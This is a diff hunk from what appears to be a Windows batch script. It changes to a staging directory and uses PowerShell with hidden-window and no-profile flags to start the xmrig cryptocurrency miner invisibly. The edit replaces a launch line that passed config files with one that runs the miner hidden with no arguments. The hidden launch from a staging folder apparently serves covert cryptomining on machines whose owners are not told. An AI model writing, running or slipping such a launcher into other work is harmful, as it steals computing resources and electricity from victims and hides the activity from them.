@@ -18,4 +18,4 @@ if not exist "%STAGE%\config.json" (
 )
 
 cd /d "%STAGE%"
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\xmrig.exe' -ArgumentList '-c config.json -c config2.json' -WorkingDirectory '%STAGE%' -WindowStyle Hidden"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\xmrig.exe' -WindowStyle Hidden"
